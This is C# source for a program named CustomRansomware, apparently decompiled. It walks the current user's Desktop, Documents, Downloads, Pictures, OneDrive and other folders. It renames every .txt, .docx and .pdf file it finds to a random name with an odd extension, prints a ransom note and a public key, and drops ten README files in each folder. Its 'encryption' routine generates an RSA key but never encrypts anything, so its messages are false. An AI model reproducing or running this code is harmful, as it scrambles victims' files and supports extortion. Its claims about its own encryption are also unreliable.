using System;
using System.IO;
using System.Security.Cryptography;

namespace Ransomware
{
	// Token: 0x02000004 RID: 4
	internal class CustomRansomware
	{
		// Token: 0x06000003 RID: 3 RVA: 0x0000206C File Offset: 0x0000026C
		private static void Main(string[] args)
		{
			string str = "C:\\Users\\";
			string userName = Environment.UserName;
			string[] array = new string[]
			{
				str + userName + "\\Desktop",
				str + userName + "\\Links",
				str + userName + "\\Contacts",
				str + userName + "\\Desktop",
				str + userName + "\\Documents",
				str + userName + "\\Downloads",
				str + userName + "\\Pictures",
				str + userName + "\\Music",
				str + userName + "\\OneDrive",
				str + userName + "\\Saved Games",
				str + userName + "\\Favorites",
				str + userName + "\\Searches",
				str + userName + "\\Videos"
			};
			string[] fileExtensions = new string[]
			{
				".txt",
				".docx",
				".pdf"
			};
			foreach (string directory in array)
			{
				CustomRansomware.EncryptFilesInDirectory(directory, fileExtensions);
				CustomRansomware.CreateReadmeFiles(directory);
			}
			Console.WriteLine("Files encrypted successfully!");
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021B0 File Offset: 0x000003B0
		private static void EncryptFilesInDirectory(string directory, string[] fileExtensions)
		{
			string[] files = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				string file = array[i];
				bool flag = Array.Exists<string>(fileExtensions, (string ext) => ext.Equals(Path.GetExtension(file), StringComparison.InvariantCultureIgnoreCase));
				if (flag)
				{
					CustomRansomware.EncryptFile(file);
				}
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002214 File Offset: 0x00000414
		private static void EncryptFile(string filePath)
		{
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(3072))
			{
				string path = Path.ChangeExtension(Path.GetRandomFileName(), "e4aibjtrguqlyaow");
				File.Move(filePath, Path.Combine(Path.GetDirectoryName(filePath), path));
				byte[] inArray = rsacryptoServiceProvider.ExportCspBlob(false);
				string str = Convert.ToBase64String(inArray);
				Console.WriteLine("File encrypted: " + filePath);
				Console.WriteLine("Ransomware note: Your files have been encrypted. Contact us to get the decryption key.");
				Console.WriteLine("Public key: " + str);
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000022AC File Offset: 0x000004AC
		private static void CreateReadmeFiles(string directory)
		{
			for (int i = 1; i <= 10; i++)
			{
				string text = Path.Combine(directory, string.Format("README{0}.txt", i));
				File.WriteAllText(text, "КУКУ");
				Console.WriteLine("Created README file: " + text);
			}
		}
	}
}
